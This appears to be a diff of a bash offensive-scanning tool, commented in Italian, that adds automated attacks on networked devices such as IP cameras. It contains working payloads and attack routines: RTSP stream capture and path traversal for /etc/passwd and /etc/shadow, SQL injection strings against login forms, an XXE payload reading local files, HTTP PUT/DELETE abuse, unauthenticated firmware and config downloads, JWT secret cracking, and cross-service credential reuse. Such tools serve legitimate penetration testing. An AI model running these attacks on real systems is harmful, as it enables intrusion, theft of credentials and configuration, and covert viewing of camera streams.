+    # ── RTSP: stream capture con ffmpeg (se accesso confermato) ──
+    if [[ $DRY_RUN -eq 0 ]] && command -v ffmpeg &>/dev/null; then
+        if [[ -s "$OUTDIR_BASE/rtsp/anon_access_554.txt" || \
+              -s "$OUTDIR_BASE/rtsp/anon_access_8554.txt" || \
+              -s "$OUTDIR_BASE/rtsp/valid_creds.txt" ]]; then
+            log "  ▶ RTSP stream capture (5 secondi)"
+            ran_attack=1
+            local _rcap_port=554; _port_open 8554 && _rcap_port=8554
+            local _rcap_url="rtsp://${target}:${_rcap_port}/"
+            # Preferisce credenziali valide se disponibili
+            if [[ -s "$OUTDIR_BASE/rtsp/valid_creds.txt" ]]; then
+                local _vc; _vc=$(head -1 "$OUTDIR_BASE/rtsp/valid_creds.txt")
+                _rcap_url="rtsp://${_vc}@${target}:${_rcap_port}/"
+            fi
+            local _cap_out="$OUTDIR_BASE/rtsp/capture_5s.mp4"
+            timeout 20 ffmpeg -rtsp_transport tcp -i "$_rcap_url" \
+                -t 5 -c copy "$_cap_out" -y 2>/dev/null || \
+            timeout 20 ffmpeg -i "$_rcap_url" \
+                -t 5 -c copy "$_cap_out" -y 2>/dev/null || true
+            if [[ -s "$_cap_out" ]]; then
+                found HIGH "RTSP:${_rcap_port} — stream catturato (5s) → rtsp/capture_5s.mp4 ($(du -h "$_cap_out" | cut -f1))"
+            fi
+        fi
+    fi
+
+    # ── RTSP: path traversal ─────────────────────────────────────
+    if { _port_open 554 || _port_open 8554; }; then
+        log "  ▶ RTSP path traversal"
+        ran_attack=1
+        local _rpt=554; _port_open 8554 && _rpt=8554
+        if [[ $DRY_RUN -eq 0 ]]; then
+            mkdir -p "$OUTDIR_BASE/rtsp"
+            local _trav_payloads=(
+                "/../../../etc/passwd"
+                "/..%2F..%2F..%2Fetc%2Fpasswd"
+                "/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
+                "/live/..%2F..%2F..%2Fetc%2Fpasswd"
+                "/stream/../../../../etc/shadow"
+            )
+            for _tp in "${_trav_payloads[@]}"; do
+                local _tr
+                _tr=$(timeout 5 bash -c \
+                    "printf 'DESCRIBE rtsp://${target}:${_rpt}${_tp} RTSP/1.0\r\nCSeq: 1\r\n\r\n' \
+                     | nc -q 2 ${target} ${_rpt} 2>/dev/null" || true)
+                if echo "$_tr" | grep -qE "root:x:0:0|root::0:0|nobody:x:"; then
+                    found CRITICAL "RTSP:${_rpt} — path traversal: ${_tp} — /etc/passwd esposto"
+                    echo "$_tr" > "$OUTDIR_BASE/rtsp/traversal.txt"
+                    break
+                fi
+            done
+        else
+            echo -e "${CYAN}[DRY-RUN]${NC} RTSP path traversal (/../../../etc/passwd)"
+        fi
+    fi
+
+    # ── RTSP: TEARDOWN probe (verifica crash/reset servizio) ──────
+    if { _port_open 554 || _port_open 8554; }; then
+        log "  ▶ RTSP TEARDOWN probe"
+        ran_attack=1
+        local _rtd=554; _port_open 8554 && _rtd=8554
+        if [[ $DRY_RUN -eq 0 ]]; then
+            mkdir -p "$OUTDIR_BASE/rtsp"
+            local _td_resp
+            _td_resp=$(timeout 5 bash -c \
+                "printf 'TEARDOWN rtsp://${target}:${_rtd}/ RTSP/1.0\r\nCSeq: 1\r\nSession: 999999999\r\n\r\n' \
+                 | nc -q 2 ${target} ${_rtd} 2>/dev/null" || true)
+            local _td_code; _td_code=$(echo "$_td_resp" | grep -oP '(?<=RTSP/1.0 )\d+' | head -1 || true)
+            echo "$_td_resp" > "$OUTDIR_BASE/rtsp/teardown.txt"
+            log "  RTSP TEARDOWN → ${_td_code:-no response}"
+            sleep 1
+            local _ping_after
+            _ping_after=$(timeout 3 bash -c \
+                "printf 'OPTIONS * RTSP/1.0\r\nCSeq: 2\r\n\r\n' \
+                 | nc -q 2 ${target} ${_rtd} 2>/dev/null" || true)
+            [[ -z "$_ping_after" ]] && \
+                found HIGH "RTSP:${_rtd} — nessuna risposta dopo TEARDOWN (possibile crash/reset del servizio)"
+        else
+            echo -e "${CYAN}[DRY-RUN]${NC} RTSP TEARDOWN senza Session ID valido → verifica crash"
+        fi
+    fi
+
+    # ── RTSP: multicast check ────────────────────────────────────
+    if { _port_open 554 || _port_open 8554; }; then
+        log "  ▶ RTSP multicast check"
+        ran_attack=1
+        local _rmc=554; _port_open 8554 && _rmc=8554
+        if [[ $DRY_RUN -eq 0 ]]; then
+            mkdir -p "$OUTDIR_BASE/rtsp"
+            local _mc_resp
+            _mc_resp=$(timeout 6 bash -c \
+                "printf 'DESCRIBE rtsp://${target}:${_rmc}/ RTSP/1.0\r\nCSeq: 1\r\nAccept: application/sdp\r\n\r\n' \
+                 | nc -q 3 ${target} ${_rmc} 2>/dev/null" || true)
+            if [[ -n "$_mc_resp" ]]; then
+                echo "$_mc_resp" > "$OUTDIR_BASE/rtsp/describe_sdp.txt"
+                # Indirizzi multicast nel SDP (224.x.x.x o 239.x.x.x)
+                local _mc_addr; _mc_addr=$(echo "$_mc_resp" | \
+                    grep -oP '(?<=c=IN IP4 )2(2[4-9]|3\d)\.\d+\.\d+\.\d+' | head -1 || true)
+                if [[ -n "$_mc_addr" ]]; then
+                    found HIGH "RTSP:${_rmc} — multicast stream: $_mc_addr (LAN accessibile senza auth)"
+                    echo "multicast_addr=$_mc_addr" > "$OUTDIR_BASE/rtsp/multicast.txt"
+                    if command -v ffmpeg &>/dev/null; then
+                        local _mc_cap="$OUTDIR_BASE/rtsp/multicast_capture.mp4"
+                        timeout 8 ffmpeg -i "udp://@${_mc_addr}:554" \
+                            -t 3 -c copy "$_mc_cap" -y 2>/dev/null || true
+                        [[ -s "$_mc_cap" ]] && \
+                            found HIGH "RTSP multicast — stream catturato: rtsp/multicast_capture.mp4"
+                    fi
+                else
+                    log "  RTSP: nessun indirizzo multicast nel SDP"
+                fi
+            fi
+        else
+            echo -e "${CYAN}[DRY-RUN]${NC} RTSP DESCRIBE → SDP multicast address check"
+        fi
+    fi
+
     # ── RTSP: credenziali embedded negli URL scoperti (Fase 2) ──────
     # Molte cam espongono coppie user/password direttamente nel path RTSP
     if [[ $DRY_RUN -eq 0 ]]; then
@@ -9454,6 +10898,358 @@ cmd_auto() {
         fi
     fi
 
+    # ── SSL: certificate analysis (self-signed / expired / weak key) ──
+    if { _port_open 443 || _port_open 8443; }; then
+        log "  ▶ SSL certificate analysis"
+        ran_attack=1
+        if [[ $DRY_RUN -eq 0 ]]; then
+            local _ssl_atk_dir="$OUTDIR_BASE/ssl_analysis"
+            mkdir -p "$_ssl_atk_dir"
+            for _sp in 443 8443; do
+                _port_open "$_sp" || continue
+                local _cert_info
+                _cert_info=$(echo | timeout 8 openssl s_client \
+                    -connect "${target}:${_sp}" -servername "${target}" 2>/dev/null \
+                    | openssl x509 -noout -text 2>/dev/null || true)
+                [[ -z "$_cert_info" ]] && continue
+                echo "$_cert_info" > "$_ssl_atk_dir/cert_${_sp}.txt"
+                # Self-signed
+                local _issuer _subj
+                _issuer=$(echo "$_cert_info" | grep -i "Issuer:"  | head -1 | sed 's/.*Issuer://'  | tr -d ' ' || true)
+                _subj=$(echo   "$_cert_info" | grep -i "Subject:" | head -1 | sed 's/.*Subject://' | tr -d ' ' || true)
+                [[ -n "$_issuer" && "$_issuer" == "$_subj" ]] && \
+                    found LOW "SSL:${_sp} — certificato self-signed"
+                # Scaduto
+                local _notafter; _notafter=$(echo "$_cert_info" | grep -i "Not After" | grep -oP ':\s*\K.+' || true)
+                if [[ -n "$_notafter" ]]; then
+                    local _exp_ts; _exp_ts=$(date -d "$_notafter" +%s 2>/dev/null || echo 0)
+                    [[ "$_exp_ts" -gt 0 && "$_exp_ts" -lt "$(date +%s)" ]] && \
+                        found MEDIUM "SSL:${_sp} — certificato SCADUTO: $_notafter"
+                fi
+                # Chiave debole
+                local _ks; _ks=$(echo "$_cert_info" | grep -oP '(?<=Public-Key: \()\d+' | head -1 || true)
+                [[ -n "$_ks" && "$_ks" -lt 2048 ]] && \
+                    found HIGH "SSL:${_sp} — chiave RSA debole: ${_ks} bit"
+                # CN/O per fingerprint vendor
+                local _cn; _cn=$(echo "$_cert_info" | grep -oP '(?<=CN\s=\s|CN = )[^,\n]+' | head -1 || true)
+                local _org; _org=$(echo "$_cert_info" | grep -oP '(?<=O\s=\s|O = )[^,\n]+' | head -1 || true)
+                [[ -n "$_cn" ]] && log "  SSL:${_sp} CN=${_cn} O=${_org:-n/a}"
+                # SHA-1 fingerprint
+                echo | timeout 5 openssl s_client -connect "${target}:${_sp}" 2>/dev/null \
+                    | openssl x509 -noout -fingerprint -sha1 2>/dev/null \
+                    >> "$_ssl_atk_dir/fingerprints.txt" || true
+            done
+        else
+            echo -e "${CYAN}[DRY-RUN]${NC} SSL cert: self-signed/expired/weak-key/vendor fingerprint"
+        fi
+    fi
+
+    # ── Firmware / config download senza autenticazione ──────────
+    _fw_download_check() {
+        local _sc="$1" _po="$2"
+        local _ins=""; [[ "$_sc" == "https" ]] && _ins="-k"
+        local _fw_dir="$OUTDIR_BASE/firmware_download"
+        mkdir -p "$_fw_dir"
+        local _fw_paths=(
+            "/firmware.bin" "/firmware.img" "/upgrade.bin" "/update.bin"
+            "/backup.cfg" "/config.bin" "/config.tar.gz" "/system.cfg"
+            "/running-config" "/startup-config" "/flash/config.cfg"
+            "/cgi-bin/download.cgi?file=config" "/api/v1/backup"
+            "/ISAPI/System/deviceInfo" "/cgi-bin/param.cgi?action=export"
+            "/cgi-bin/config.bin" "/web/config.bin" "/admin/backup"
+        )
+        for _fp in "${_fw_paths[@]}"; do
+            local _outf="$_fw_dir/$(echo "$_fp" | tr '/?' '_').bin"
+            local _code
+            _code=$(curl -s $_ins --max-time 10 -o "$_outf" -w "%{http_code}" \
+                "${_sc}://${target}:${_po}${_fp}" 2>/dev/null || echo "000")
+            if [[ "$_code" == "200" && -s "$_outf" ]]; then
+                local _sz; _sz=$(wc -c < "$_outf")
+                if ! file "$_outf" 2>/dev/null | grep -qi "HTML document\|ASCII text" || \
+                   { [[ $_sz -gt 500 ]] && ! grep -qi "<html\|<!DOCTYPE" "$_outf" 2>/dev/null; }; then
+                    found CRITICAL "Firmware/config download senza auth: ${_sc}:${_po}${_fp} ($_sz byte)"
+                else
+                    rm -f "$_outf"
+                fi
+            else
+                rm -f "$_outf" 2>/dev/null || true
+            fi
+        done
+    }
+    if [[ $DRY_RUN -eq 0 ]]; then
+        _svc_found 80   "http.*80\|web.*80"  && { _fw_download_check http  80;   ran_attack=1; }
+        _svc_found 443  "https\|ssl.*443"    && { _fw_download_check https 443;  ran_attack=1; }
+        _svc_found 8080 "http.*8080"         && { _fw_download_check http  8080; ran_attack=1; }
+        _svc_found 8443 "https.*8443"        && { _fw_download_check https 8443; ran_attack=1; }
+    else
+        { _svc_found 80 "http" || _svc_found 443 "https"; } && \
+            echo -e "${CYAN}[DRY-RUN]${NC} Firmware/config download senza auth (firmware.bin, backup.cfg, ...)"
+    fi
+
+    # ── API endpoint bruteforce + OpenAPI/GraphQL discovery ───────
+    _api_enum() {
+        local _sc="$1" _po="$2"
+        local _ins=""; [[ "$_sc" == "https" ]] && _ins="-k"
+        local _api_dir="$OUTDIR_BASE/api_enum"
+        mkdir -p "$_api_dir"
+        # OpenAPI / Swagger / GraphQL
+        local _spec_paths=("/swagger.json" "/openapi.json" "/api-docs" "/api/swagger.json"
+                           "/v1/api-docs" "/graphql" "/graphiql" "/__graphql" "/api/graphql")
+        for _sp in "${_spec_paths[@]}"; do
+            local _sresp
+            _sresp=$(curl -s $_ins --max-time 5 \
+                "${_sc}://${target}:${_po}${_sp}" 2>/dev/null || true)
+            if echo "$_sresp" | grep -qi '"swagger"\|"openapi"\|"paths"\|__schema\|__typename'; then
+                echo "$_sresp" > "$_api_dir/spec_$(echo "$_sp" | tr '/?' '_').json"
+                local _title; _title=$(echo "$_sresp" | grep -oP '"title":\s*"\K[^"]+' | head -1 || true)
+                found HIGH "API spec esposta senza auth: ${_sc}:${_po}${_sp}${_title:+ — $_title}"
+            fi
+        done
+        # REST endpoint comuni
+        local _api_eps=("/api" "/api/v1" "/api/v2" "/api/v1/users" "/api/v1/config"
+                        "/api/v1/system" "/api/v1/info" "/api/v1/status" "/api/v1/devices"
+                        "/rest" "/rest/v1" "/v1" "/v2" "/v1/info")
+        for _ep in "${_api_eps[@]}"; do
+            local _ecode
+            _ecode=$(curl -s $_ins -o /dev/null -w "%{http_code}" --max-time 4 \
+                "${_sc}://${target}:${_po}${_ep}" 2>/dev/null || echo "000")
+            if [[ "$_ecode" == "200" ]]; then
+                local _eresp
+                _eresp=$(curl -s $_ins --max-time 4 \
+                    "${_sc}://${target}:${_po}${_ep}" 2>/dev/null | head -c 300 || true)
+                echo "$_eresp" > "$_api_dir/ep_$(echo "$_ep" | tr '/?' '_').txt"
+                found MEDIUM "API endpoint senza auth: ${_sc}:${_po}${_ep} (HTTP 200)"
+            elif [[ "$_ecode" == "401" || "$_ecode" == "403" ]]; then
+                echo "${_sc}:${_po}${_ep} HTTP $_ecode" >> "$_api_dir/auth_required.txt"
+            fi
+        done
+    }
+    if [[ $DRY_RUN -eq 0 ]]; then
+        _svc_found 80   "http.*80\|web.*80"  && { _api_enum http  80;   ran_attack=1; }
+        _svc_found 443  "https\|ssl.*443"    && { _api_enum https 443;  ran_attack=1; }
+        _svc_found 8080 "http.*8080"         && { _api_enum http  8080; ran_attack=1; }
+        _svc_found 8443 "https.*8443"        && { _api_enum https 8443; ran_attack=1; }
+    else
+        { _svc_found 80 "http" || _svc_found 443 "https"; } && \
+            echo -e "${CYAN}[DRY-RUN]${NC} API enum: OpenAPI/Swagger/GraphQL + REST endpoint probe"
+    fi
+
+    # ── HTTP methods abuse (PUT/DELETE/TRACE) ─────────────────────
+    _http_methods_abuse() {
+        local _sc="$1" _po="$2"
+        local _ins=""; [[ "$_sc" == "https" ]] && _ins="-k"
+        local _meth_dir="$OUTDIR_BASE/http_methods"
+        mkdir -p "$_meth_dir"
+        # OPTIONS → metodi permessi
+        local _opt_h
+        _opt_h=$(curl -s $_ins --max-time 5 -X OPTIONS -D - -o /dev/null \
+            "${_sc}://${target}:${_po}/" 2>/dev/null || true)
+        echo "$_opt_h" | grep -i "^Allow:" >> "$_meth_dir/allowed.txt" 2>/dev/null || true
+        # TRACE → XST
+        local _trace_r
+        _trace_r=$(curl -s $_ins --max-time 5 -X TRACE \
+            -H "X-Exa-Test: exa-dune-xst-$$" \
+            "${_sc}://${target}:${_po}/" 2>/dev/null || true)
+        if echo "$_trace_r" | grep -qi "exa-dune-xst-$$\|200 OK"; then
+            found MEDIUM "HTTP TRACE abilitato su ${_sc}:${_po} (Cross-Site Tracing)"
+        fi
+        # PUT → upload arbitrario
+        local _put_c
+        _put_c=$(curl -s $_ins --max-time 5 -X PUT \
+            -d "exa-dune-test-$$" -w "%{http_code}" -o /dev/null \
+            "${_sc}://${target}:${_po}/exa_put_test_$$.txt" 2>/dev/null || echo "000")
+        if [[ "$_put_c" == "200" || "$_put_c" == "201" ]]; then
+            found CRITICAL "HTTP PUT abilitato su ${_sc}:${_po} — upload arbitrario di file"
+            curl -s $_ins --max-time 3 -X DELETE \
+                "${_sc}://${target}:${_po}/exa_put_test_$$.txt" 2>/dev/null || true
+        fi
+        # DELETE
+        local _del_c
+        _del_c=$(curl -s $_ins --max-time 5 -X DELETE -w "%{http_code}" -o /dev/null \
+            "${_sc}://${target}:${_po}/exa_nonexistent_$$" 2>/dev/null || echo "000")
+        if [[ "$_del_c" == "200" || "$_del_c" == "204" ]]; then
+            found HIGH "HTTP DELETE abilitato su ${_sc}:${_po}"
+        fi
+    }
+    if [[ $DRY_RUN -eq 0 ]]; then
+        _svc_found 80   "http.*80\|web.*80"  && { _http_methods_abuse http  80;   ran_attack=1; }
+        _svc_found 443  "https\|ssl.*443"    && { _http_methods_abuse https 443;  ran_attack=1; }
+        _svc_found 8080 "http.*8080"         && { _http_methods_abuse http  8080; ran_attack=1; }
+        _svc_found 8443 "https.*8443"        && { _http_methods_abuse https 8443; ran_attack=1; }
+    else
+        { _svc_found 80 "http" || _svc_found 443 "https"; } && \
+            echo -e "${CYAN}[DRY-RUN]${NC} HTTP methods: OPTIONS/TRACE/PUT/DELETE abuse"
+    fi
+
+    # ── SQL injection su form login ───────────────────────────────
+    _sqli_login_test() {
+        local _sc="$1" _po="$2"
+        local _ins=""; [[ "$_sc" == "https" ]] && _ins="-k"
+        local _sqli_dir="$OUTDIR_BASE/sqli"
+        mkdir -p "$_sqli_dir"
+        local _payloads=("' OR '1'='1" "' OR 1=1--" "admin'--" "' OR 'x'='x" "1' OR '1'='1'--")
+        local _login_paths=("/login" "/admin/login" "/cgi-bin/login.cgi" "/web/login"
+                            "/api/v1/login" "/api/login" "/auth" "/j_security_check"
+                            "/login.html" "/login.php" "/index.php" "/cgi-bin/admin.cgi")
+        for _lpath in "${_login_paths[@]}"; do
+            local _lc
+            _lc=$(curl -s $_ins -o /dev/null -w "%{http_code}" --max-time 4 \
+                "${_sc}://${target}:${_po}${_lpath}" 2>/dev/null || echo "000")
+            [[ "$_lc" == "000" || "$_lc" == "404" ]] && continue
+            for _pay in "${_payloads[@]}"; do
+                local _sr
+                _sr=$(curl -s $_ins --max-time 6 -X POST \
+                    -d "username=${_pay}&password=${_pay}&user=${_pay}&pass=${_pay}" \
+                    "${_sc}://${target}:${_po}${_lpath}" 2>/dev/null || true)
+                if echo "$_sr" | grep -qiE "sql syntax|you have an error in|ORA-[0-9]+|sqlite.*error|pg_query|mysql_fetch|ODBC.*error"; then
+                    found CRITICAL "SQLi — errore DB esposto su ${_sc}:${_po}${_lpath} (payload: $_pay)"
+                    echo "$_sr" > "$_sqli_dir/sqli_${_po}_${_lpath//\//_}.txt"
+                    break 2
+                fi
+            done
+        done
+    }
+    if [[ $DRY_RUN -eq 0 ]]; then
+        _svc_found 80   "http.*80\|web.*80"  && { _sqli_login_test http  80;   ran_attack=1; }
+        _svc_found 443  "https\|ssl.*443"    && { _sqli_login_test https 443;  ran_attack=1; }
+        _svc_found 8080 "http.*8080"         && { _sqli_login_test http  8080; ran_attack=1; }
+        _svc_found 8443 "https.*8443"        && { _sqli_login_test https 8443; ran_attack=1; }
+    else
+        { _svc_found 80 "http" || _svc_found 443 "https"; } && \
+            echo -e "${CYAN}[DRY-RUN]${NC} SQLi payload su form login (errore DB detection)"
+    fi
+
+    # ── XXE injection su endpoint XML/SOAP ───────────────────────
+    _xxe_test() {
+        local _sc="$1" _po="$2"
+        local _ins=""; [[ "$_sc" == "https" ]] && _ins="-k"
+        local _xxe_dir="$OUTDIR_BASE/xxe"
+        mkdir -p "$_xxe_dir"
+        local _xxe_payload='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root><data>&xxe;</data></root>'
+        local _xml_eps=("/onvif/device_service" "/soap" "/api/v1/xml"
+                        "/cgi-bin/xml.cgi" "/ws" "/service" "/api/xml")
+        # Aggiunge endpoint trovati in FASE 2
+        local _extra_eps; _extra_eps=$(find "$OUTDIR_BASE" -name "*.txt" -exec \
+            grep -ohP 'https?://[^\s"'"'"'>]+(?:xml|soap|wsdl|onvif)[^\s"'"'"'>]*' {} \; \
+            2>/dev/null | sort -u | head -10 || true)
+        for _ep in "${_xml_eps[@]}" $(echo "$_extra_eps"); do
+            local _xurl="${_sc}://${target}:${_po}${_ep}"
+            [[ "$_ep" == http* ]] && _xurl="$_ep"
+            local _xr
+            _xr=$(curl -s $_ins --max-time 6 -X POST \
+                -H "Content-Type: application/xml" \
+                -d "$_xxe_payload" "$_xurl" 2>/dev/null || true)
+            if echo "$_xr" | grep -qE "root:x:0:0|root::0:0|nobody:x:"; then
+                found CRITICAL "XXE — /etc/passwd esposto via ${_xurl}"
+                echo "$_xr" > "$_xxe_dir/xxe_passwd_${_po}.txt"
+                break
+            fi
+        done
+    }
+    if [[ $DRY_RUN -eq 0 ]]; then
+        _svc_found 80   "http.*80\|web.*80"  && { _xxe_test http  80;   ran_attack=1; }
+        _svc_found 443  "https\|ssl.*443"    && { _xxe_test https 443;  ran_attack=1; }
+        _svc_found 8080 "http.*8080"         && { _xxe_test http  8080; ran_attack=1; }
+        _svc_found 8443 "https.*8443"        && { _xxe_test https 8443; ran_attack=1; }
+    else
+        { _svc_found 80 "http" || _svc_found 443 "https"; } && \
+            echo -e "${CYAN}[DRY-RUN]${NC} XXE injection su endpoint XML/SOAP (file:///etc/passwd)"
+    fi
+
+    # ── JWT weak secret (da token trovati in JS analysis) ─────────
+    if [[ $DRY_RUN -eq 0 && -d "$OUTDIR_BASE/js" ]]; then
+        local _jwt_tokens; _jwt_tokens=$(grep -rihEo \
+            'ey[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]+' \
+            "$OUTDIR_BASE/js" 2>/dev/null | sort -u | head -10 || true)
+        if [[ -n "$_jwt_tokens" ]]; then
+            log "  ▶ JWT weak secret crack"
+            ran_attack=1
+            local _jwt_dir="$OUTDIR_BASE/jwt"
+            mkdir -p "$_jwt_dir"
+            echo "$_jwt_tokens" > "$_jwt_dir/found_tokens.txt"
+            log "  JWT token trovati: $(echo "$_jwt_tokens" | wc -l)"
+            if command -v hashcat &>/dev/null; then
+                local _wl; _wl=$(_wl_pass)
+                while IFS= read -r _tok; do
+                    hashcat -a 0 -m 16500 "$_tok" "$_wl" \
+                        --outfile "$_jwt_dir/cracked.txt" -q 2>/dev/null || true
+                    [[ -s "$_jwt_dir/cracked.txt" ]] && \
+                        found CRITICAL "JWT HS256 secret craccato: $(head -1 "$_jwt_dir/cracked.txt")" && break
+                done <<< "$_jwt_tokens"
+            else
+                # Brute-force manuale con secrets comuni via python3
+                local _common_sec=("secret" "password" "admin" "jwt_secret" "change_me"
+                                   "secret_key" "mysecret" "supersecret" "1234" "key" "token")
+                local _first_tok; _first_tok=$(echo "$_jwt_tokens" | head -1)
+                IFS='.' read -ra _jparts <<< "$_first_tok"
+                for _jsec in "${_common_sec[@]}"; do
+                    local _jcheck
+                    _jcheck=$(python3 -c "
+import hmac,hashlib,base64
+hp='${_jparts[0]}.${_jparts[1]}'.encode()
+sig=base64.urlsafe_b64encode(hmac.new('${_jsec}'.encode(),hp,hashlib.sha256).digest()).rstrip(b'=').decode()
+print('OK' if sig=='${_jparts[2]}' else 'NO')
+" 2>/dev/null || echo "NO")
+                    if [[ "$_jcheck" == "OK" ]]; then
+                        found CRITICAL "JWT secret debole: '${_jsec}'"
+                        echo "${_first_tok}:${_jsec}" > "$_jwt_dir/cracked.txt"
+                        break
+                    fi
+                done
+            fi
+        fi
+    else
+        { _svc_found 80 "http" || _svc_found 443 "https"; } && [[ $DRY_RUN -eq 1 ]] && \
+            echo -e "${CYAN}[DRY-RUN]${NC} JWT weak secret crack (hashcat m16500 / python3 bruteforce)"
+    fi
+
+    # ── Cookie / session analysis ─────────────────────────────────
+    _cookie_analysis() {
+        local _sc="$1" _po="$2"
+        local _ins=""; [[ "$_sc" == "https" ]] && _ins="-k"
+        local _ck_dir="$OUTDIR_BASE/cookies"
+        mkdir -p "$_ck_dir"
+        # Raccoglie Set-Cookie da root e pagina login
+        local _cookies=""
+        for _ckpath in "/" "/login" "/admin"; do
+            local _hdrs
+            _hdrs=$(curl -s $_ins --max-time 6 -D - -o /dev/null \
+                "${_sc}://${target}:${_po}${_ckpath}" 2>/dev/null || true)
+            _cookies+=$(echo "$_hdrs" | grep -i "^Set-Cookie:" || true)
+        done
+        [[ -z "$_cookies" ]] && return 0
+        echo "$_cookies" > "$_ck_dir/cookies_${_po}.txt"
+        while IFS= read -r _ck; do
+            [[ -z "$_ck" ]] && continue
+            local _cn; _cn=$(echo "$_ck" | grep -oP 'Set-Cookie:\s*\K[^=;]+' | head -1 || true)
+            # Flag Secure su HTTPS
+            [[ "$_sc" == "https" ]] && ! echo "$_ck" | grep -qi "Secure" && \
+                found LOW "Cookie '${_cn}' senza Secure su HTTPS (${_sc}:${_po})"
+            # HttpOnly
+            ! echo "$_ck" | grep -qi "HttpOnly" && \
+                found LOW "Cookie '${_cn}' senza HttpOnly — accessibile via JS (${_sc}:${_po})"
+            # SameSite
+            ! echo "$_ck" | grep -qi "SameSite" && \
+                found LOW "Cookie '${_cn}' senza SameSite — possibile CSRF (${_sc}:${_po})"
+            # Valore base64 → decode
+            local _cv; _cv=$(echo "$_ck" | grep -oP 'Set-Cookie:\s*[^=]+=\K[^;]+' | head -1 || true)
+            if echo "$_cv" | grep -qP '^[A-Za-z0-9+/]{16,}={0,2}$'; then
+                local _dec; _dec=$(echo "$_cv" | base64 -d 2>/dev/null || true)
+                echo "$_dec" | grep -qP '[\x20-\x7E]{6,}' && \
+                    found MEDIUM "Cookie '${_cn}' — valore base64 decodificato: ${_dec:0:80}"
+            fi
+        done <<< "$_cookies"
+    }
+    if [[ $DRY_RUN -eq 0 ]]; then
+        _svc_found 80   "http.*80\|web.*80"  && { _cookie_analysis http  80;   ran_attack=1; }
+        _svc_found 443  "https\|ssl.*443"    && { _cookie_analysis https 443;  ran_attack=1; }
+        _svc_found 8080 "http.*8080"         && { _cookie_analysis http  8080; ran_attack=1; }
+        _svc_found 8443 "https.*8443"        && { _cookie_analysis https 8443; ran_attack=1; }
+    else
+        { _svc_found 80 "http" || _svc_found 443 "https"; } && \
+            echo -e "${CYAN}[DRY-RUN]${NC} Cookie analysis: Secure/HttpOnly/SameSite flag + base64 decode"
+    fi
+
     # ── RTMP unauthenticated stream access (porta 1935) ───────────
     if _svc_found 1935 "rtmp\|RTMP"; then
         log "  ▶ RTMP unauthenticated stream probe"
@@ -9488,50 +11284,117 @@ cmd_auto() {
         fi
     fi
 
-    # ── SNMP community string reuse su altri servizi ──────────────
-    # Se la community è stata trovata in Fase 2, prova a riutilizzarla
-    # su servizi che accettano le stesse credenziali (Telnet, web, SSH)
-    if [[ $DRY_RUN -eq 0 ]]; then
-        local _snmp_comm_file="$OUTDIR_BASE/snmp/community_found.txt"
-        # Il modulo snmp salva la community trovata in community_found.txt
-        if [[ ! -s "$_snmp_comm_file" ]]; then
-            # Prova a recuperarla dai findings
-            _snmp_comm_file=$(find "$OUTDIR_BASE/snmp" -name "*.txt" 2>/dev/null \
-                | xargs grep -liE "community string.*found|found.*community" 2>/dev/null | head -1 || true)
-        fi
-        local _found_community
-        _found_community=$(grep -oiP "(?<=community[= :'\"]+)\\S+" \
+    # ── Correlazione credenziali cross-service ────────────────────
+    # Tutte le credenziali trovate in questa sessione vengono ritentate
+    # su ogni altro servizio aperto — password reuse è comune su IoT/VoIP
+    if [[ $DRY_RUN -eq 0 && -s "${CRED_STORE:-}" ]]; then
+        log "  ▶ Correlazione credenziali cross-service (password reuse)"
+        ran_attack=1
+        local _corr_dir="$OUTDIR_BASE/correlation"
+        mkdir -p "$_corr_dir"
+
+        # Raccogli tutte le credenziali trovate finora (da cred store + SNMP community)
+        local _all_creds=()
+        local _cs_dump; _cs_dump=$(python3 -c "
+import json,sys
+try:
+    data=json.load(open('${CRED_STORE}'))
+    for e in data:
+        u=e.get('username',''); p=e.get('password','')
+        if u: print(f'{u}:{p}')
+except: pass
+" 2>/dev/null || true)
+        while IFS= read -r _cp; do
+            [[ -n "$_cp" ]] && _all_creds+=("$_cp")
+        done <<< "$_cs_dump"
+
+        # Aggiungi SNMP community come password
+        local _snmp_comm
+        _snmp_comm=$(grep -oiP "(?<=community[= :'\"]+)\\S+" \
             "$OUTDIR_BASE/snmp/"*.txt 2>/dev/null | head -1 | tr -d "'\"\r" || true)
-        if [[ -n "$_found_community" && "$_found_community" != "public" ]]; then
-            log "  ▶ SNMP community '$_found_community' trovata — reuse su altri servizi"
-            ran_attack=1
-            mkdir -p "$OUTDIR_BASE/snmp"
-            # Prova la community come password su web/SSH/Telnet
-            for _reuse_port in 80 443 8080 8443; do
-                _port_open "$_reuse_port" || continue
-                local _rsc="http"; [[ "$_reuse_port" == "443" || "$_reuse_port" == "8443" ]] && _rsc="https"
-                local _ri=""; [[ "$_rsc" == "https" ]] && _ri="-k"
-                for _ruser in admin root Administrator; do
-                    local _rc
-                    _rc=$(curl -s $_ri -o /dev/null -w "%{http_code}" \
-                        --user "${_ruser}:${_found_community}" --max-time 4 \
-                        "${_rsc}://${target}:${_reuse_port}/" 2>/dev/null || echo "000")
-                    if [[ "$_rc" == "200" || "$_rc" == "302" ]]; then
-                        found HIGH "SNMP community reuse: ${_rsc}:${_reuse_port} — ${_ruser}:${_found_community}"
-                        _cred_store_add "$_rsc" "$target" "$_reuse_port" "$_ruser" "$_found_community" "snmp:reuse"
+        [[ -n "$_snmp_comm" && "$_snmp_comm" != "public" ]] && \
+            _all_creds+=("admin:$_snmp_comm" "root:$_snmp_comm" "Administrator:$_snmp_comm")
+
+        if [[ ${#_all_creds[@]} -gt 0 ]]; then
+            log "  Credenziali da correlare: ${#_all_creds[@]} coppie su tutti i servizi aperti"
+            for _cp in "${_all_creds[@]}"; do
+                local _cu="${_cp%%:*}" _cpass="${_cp##*:}"
+                [[ -z "$_cu" ]] && continue
+
+                # Web HTTP/HTTPS
+                for _cport in 80 443 8080 8443; do
+                    _port_open "$_cport" || continue
+                    local _csc="http"; [[ "$_cport" == "443" || "$_cport" == "8443" ]] && _csc="https"
+                    local _ci=""; [[ "$_csc" == "https" ]] && _ci="-k"
+                    local _ccode
+                    _ccode=$(curl -s $_ci -o /dev/null -w "%{http_code}" \
+                        --user "${_cu}:${_cpass}" --max-time 4 \
+                        "${_csc}://${target}:${_cport}/" 2>/dev/null || echo "000")
+                    if [[ "$_ccode" == "200" || "$_ccode" == "302" ]]; then
+                        found HIGH "Cred reuse ${_csc}:${_cport} — ${_cu}:${_cpass} (HTTP ${_ccode})"
